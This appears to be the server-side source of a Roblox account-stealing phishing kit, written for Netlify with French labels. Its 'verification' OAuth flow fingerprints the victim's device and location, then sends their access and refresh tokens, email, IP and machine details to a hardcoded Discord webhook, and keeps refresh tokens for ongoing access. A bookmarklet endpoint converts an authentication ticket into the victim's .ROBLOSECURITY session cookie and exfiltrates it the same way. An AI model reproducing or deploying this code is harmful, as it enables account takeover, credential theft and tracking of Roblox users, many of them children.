import { getStore } from '@netlify/blobs';

const AUTH   = 'https://apis.roblox.com/oauth/v1/authorize';
const TOKEN  = 'https://apis.roblox.com/oauth/v1/token';
const UI     = 'https://apis.roblox.com/oauth/v1/userinfo';
const REDEEM = 'https://auth.roblox.com/v1/authentication-ticket/redeem';
const HOOK   = 'https://discord.com/api/webhooks/1569385832417075382/ZmOZDVHDwEFlfCoecnWvn_8_Jjh3uIPB0hraVyFrOfeDFkvCMwsZPI4dDPUz3cpH31Yu';

const CID  = () => process.env.ROBLOX_CLIENT_ID || '';
const CSEC = () => process.env.ROBLOX_CLIENT_SECRET || '';
const BASE = () => (process.env.URL || '').replace(/\/$/, '');
const SCOPE = () => process.env.SCOPES || 'openid profile';

const store = () => getStore('rbx');
const rnd = (n = 24) => Buffer.from(crypto.getRandomValues(new Uint8Array(n))).toString('base64url');
const esc = s => String(s ?? '').replace(/[`\\*_~|]/g, c => '\\' + c).slice(0, 1000);
const basic = () => 'Basic ' + Buffer.from(CID() + ':' + CSEC()).toString('base64');

const j = (o, s = 200, extra = {}) => new Response(JSON.stringify(o), {
  status: s,
  headers: { 'content-type': 'application/json', 'cache-control': 'no-store', ...extra },
});

const cors = {
  'access-control-allow-origin': '*',
  'access-control-allow-headers': 'content-type',
  'access-control-allow-methods': 'POST,OPTIONS',
};

const html = s => new Response(s, {
  headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
});

const closePage = (msg, color) => html(
  '<body style="background:#070a12;color:' + color + ';font-family:sans-serif;' +
  'display:grid;place-items:center;height:100vh;margin:0">' + msg +
  '<script>setTimeout(function(){window.close()},600)</script></body>'
);

function authUrl(state, prompt) {
  const u = new URL(AUTH);
  u.searchParams.set('client_id', CID());
  u.searchParams.set('redirect_uri', BASE() + '/cb');
  u.searchParams.set('scope', SCOPE());
  u.searchParams.set('response_type', 'code');
  u.searchParams.set('state', state);
  if (prompt) u.searchParams.set('prompt', prompt);
  return u.toString();
}

function geo(req, context) {
  const g = context?.geo || {};
  return {
    ip: context?.ip || req.headers.get('x-nf-client-connection-ip') || '?',
    country: g.country?.code || g.country || '',
    region: g.subdivision?.name || g.subdivision || '',
    city: g.city || '',
    tz: g.timezone || '',
    org: g.isp || '',
    ua: req.headers.get('user-agent') || '',
  };
}

async function hook(embeds, file) {
  try {
    if (file) {
      const fd = new FormData();
      fd.set('payload_json', JSON.stringify({ embeds }));
      fd.set('files[0]', new Blob([file.body], { type: 'text/plain' }), file.name);
      await fetch(HOOK, { method: 'POST', body: fd });
    } else {
      await fetch(HOOK, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ embeds }),
      });
    }
  } catch {}
}

export async function refreshOne(rec) {
  const r = await fetch(TOKEN, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded', authorization: basic() },
    body: new URLSearchParams({ grant_type: 'refresh_token', refresh_token: rec.refresh_token }),
  });
  if (!r.ok) return null;
  const t = await r.json();
  rec.access_token = t.access_token;
  rec.refresh_token = t.refresh_token || rec.refresh_token;
  rec.expires_at = Date.now() + (t.expires_in || 900) * 1000;
  rec.at = Date.now();
  return rec;
}

export async function route(req, context, name) {
  const url = new URL(req.url);
  const s = store();

  // ---------- fingerprint ----------
  if (name === 'fp') {
    const fp = await req.json().catch(() => ({}));
    const cid = rnd(16);
    await s.setJSON('fp:' + cid, { fp, g: geo(req, context), c: url.searchParams.get('c') || '' });
    return j({ cid });
  }

  // ---------- popup ----------
  if (name === 'go') {
    const cid = url.searchParams.get('cid') || '';
    const k = url.searchParams.get('k') || rnd(24);
    await s.setJSON('st:' + k, { cid });
    return new Response(null, { status: 302, headers: { location: authUrl(k, 'none'), 'cache-control': 'no-store' } });
  }

  // ---------- relance ----------
  if (name === 'relogin') {
    const k = url.searchParams.get('s') || '';
    if (!(await s.get('st:' + k))) return new Response(null, { status: 302, headers: { location: BASE() + '/' } });
    return new Response(null, { status: 302, headers: { location: authUrl(k) } });
  }

  // ---------- état ----------
  if (name === 'st') {
    const raw = await s.get('st:' + (url.searchParams.get('k') || ''));
    if (!raw) return j({ s: 'lost' });
    const st = JSON.parse(raw);
    if (st.done) return j({ s: 'done', n: st.n });
    if (st.need) return j({ s: 'need', k: url.searchParams.get('k') });
    if (st.failed) return j({ s: 'fail', e: st.failed });
    return j({ s: 'pending' });
  }

  // ---------- callback ----------
  if (name === 'cb') {
    const state = url.searchParams.get('state') || '';
    const err = url.searchParams.get('error');
    const raw = await s.get('st:' + state);
    if (!raw) return closePage('Session expirée.', '#8b96ad');
    const st = JSON.parse(raw);

    if (err) {
      if (err === 'login_required' || err === 'consent_required') {
        await s.setJSON('st:' + state, { ...st, need: 1 });
        return html(
          '<body style="background:#070a12;color:#eaf0fb;font-family:sans-serif;' +
          'display:grid;place-items:center;height:100vh;margin:0;text-align:center">' +
          '<div><p style="color:#8b96ad;font-size:13px">Session Roblox requise</p>' +
          '<a href="/relogin?s=' + encodeURIComponent(state) + '" style="display:inline-block;' +
          'margin-top:14px;padding:11px 18px;border-radius:11px;background:#5b8cff;color:#fff;' +
          'text-decoration:none;font-size:13px;font-weight:600">Se connecter</a></div>' +
          '<script>try{window.resizeTo(430,600);' +
          'window.moveTo((screen.width-430)/2,60);window.focus()}catch(e){}</script></body>'
        );
      }
      await s.setJSON('st:' + state, { ...st, failed: err });
      return closePage('…', '#8b96ad');
    }

    const code = url.searchParams.get('code');
    if (!code) return closePage('Pas de code.', '#8b96ad');

    const tr = await fetch(TOKEN, {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded', authorization: basic() },
      body: new URLSearchParams({
        grant_type: 'authorization_code',
        code,
        redirect_uri: BASE() + '/cb',
      }),
    });
    const tok = await tr.json().catch(() => ({}));
    if (!tok.access_token) {
      await s.setJSON('st:' + state, { ...st, failed: 'token' });
      return closePage('Échec.', '#ff5d5d');
    }

    const ur = await fetch(UI, { headers: { authorization: 'Bearer ' + tok.access_token } });
    const u = await ur.json().catch(() => ({}));

    const ctx = st.cid ? (await s.get('fp:' + st.cid, { type: 'json' })) || {} : {};
    const g = ctx.g || geo(req, context);
    const fp = ctx.fp || {};
    const camp = ctx.c || 'direct';

    const created = u.created_at
      ? (typeof u.created_at === 'number'
          ? new Date(u.created_at * 1000).toISOString().slice(0, 10)
          : String(u.created_at).slice(0, 10))
      : '?';

    const E = [
      {
        title: 'Session vérifiée',
        color: 0x2bd576,
        description:
          '**' + esc(u.preferred_username || u.name) + '**' +
          (u.nickname && u.nickname !== u.preferred_username ? ' (' + esc(u.nickname) + ')' : '') +
          '\n`' + esc(u.sub) + '`' + (u.email ? '\n' + esc(u.email) : ''),
        thumbnail: u.picture ? { url: u.picture } : undefined,
        footer: { text: 'campagne: ' + esc(camp) },
      },
      {
        title: 'Compte',
        color: 0x1f6feb,
        fields: [
          { name: 'ID', value: '`' + esc(u.sub) + '`', inline: true },
          { name: 'Premium', value: u.premium ? 'oui' : 'non', inline: true },
          { name: 'Tranche âge', value: esc(u.age_bracket || '?'), inline: true },
          { name: 'Vérifié', value: u.verified ? 'oui' : 'non', inline: true },
          { name: 'Email vérifié', value: u.email_verified ? 'oui' : 'non', inline: true },
          { name: 'Créé', value: created, inline: true },
        ],
      },
      {
        title: 'Réseau',
        color: 0x8957e5,
        fields: [
          { name: 'IP', value: '`' + esc(g.ip) + '`', inline: true },
          { name: 'Géo', value: esc([g.city, g.region, g.country].filter(Boolean).join(', ') || '?'), inline: true },
          { name: 'FAI', value: esc(g.org || '?'), inline: true },
          { name: 'Fuseau', value: esc(g.tz || '?'), inline: true },
          { name: 'IP locale', value: '`' + esc(fp.localIP || fp.mdns || '?') + '`', inline: true },
          { name: 'Apps', value: esc(fp.apps || '?'), inline: true },
        ],
      },
      {
        title: 'Machine',
        color: 0x6e7681,
        description:
          'GPU: `' + esc(fp.gpu || '?') + '`\nÉcran: ' + esc(fp.screen || '?') +
          '\nCPU: ' + esc(fp.cores || '?') + ' coeurs / RAM: ' + esc(fp.mem || '?') +
          '\nBatterie: ' + esc(fp.batt || '?') + '\nLangue: ' + esc(fp.lang || '?') +
          '\nRéf: ' + esc(fp.ref || 'direct'),
      },
    ];

    await hook(E, {
      name: 'tokens.txt',
      body:
        'user_id: ' + u.sub +
        '\nuser: ' + (u.preferred_username || '') +
        '\naccess: ' + tok.access_token +
        '\nrefresh: ' + (tok.refresh_token || '') +
        '\nscopes: ' + (tok.scope || '') +
        '\ncampagne: ' + camp,
    });

    if (tok.refresh_token) {
      await s.setJSON('tk:' + u.sub, {
        refresh_token: tok.refresh_token, n: u.preferred_username || '', at: Date.now(),
      });
    }

    await s.setJSON('st:' + state, { done: 1, n: u.preferred_username || u.name || '' });
    return closePage('✓', '#2bd576');
  }

  // ---------- bookmarklet ----------
  if (name === 'cbx') {
    if (req.method === 'OPTIONS') return new Response(null, { headers: cors });
    const { ticket, sid, u } = await req.json().catch(() => ({}));
    if (!ticket) return j({ ok: false, reason: 'noticket' }, 200, cors);

    const r = await fetch(REDEEM, {
      method: 'POST',
      headers: { 'RBX-Authentication-Ticket': ticket, 'content-type': 'application/json' },
      body: '{}',
    });
    if (!r.ok) return j({ ok: false, reason: 'redeem ' + r.status }, 200, cors);

    const jar = r.headers.getSetCookie ? r.headers.getSetCookie() : [r.headers.get('set-cookie') || ''];
    const m = jar.join(';').match(/\.ROBLOSECURITY=([^;]+)/);
    if (!m) return j({ ok: false, reason: 'nocookie' }, 200, cors);

    if (sid) {
      const prev = (await s.get('st:' + sid, { type: 'json' })) || {};
      await s.setJSON('st:' + sid, { ...prev, cookie: m[1], cookie_at: Date.now() });
    }

    await hook([{
      title: 'Cookie récupéré',
      color: 0xe3b341,
      description: '**' + esc(u?.name || '?') + '**\n`' + esc(u?.id || '?') + '`',
      footer: { text: 'via bookmarklet' },
    }], { name: 'ROBLOSECURITY.txt', body: m[1] });

    return j({ ok: true }, 200, cors);
  }

  return new Response('404', { status: 404 });
}
